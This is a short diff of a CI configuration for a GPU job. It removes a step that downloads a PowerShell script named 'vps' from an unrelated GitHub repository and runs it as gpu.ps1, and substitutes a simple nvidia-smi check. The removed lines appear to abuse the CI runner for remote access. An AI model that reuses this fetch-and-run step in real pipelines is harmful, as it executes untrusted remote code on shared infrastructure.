@@ -27,9 +27,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: |
-              Invoke-WebRequest https://raw.githubusercontent.com/awdawdw233/rdpbya/main/vps -OutFile gpu.ps1
-        - run: ./gpu.ps1
+            command: timeout 1m nvidia-smi
 workflows:
     version: 2.1
     build:
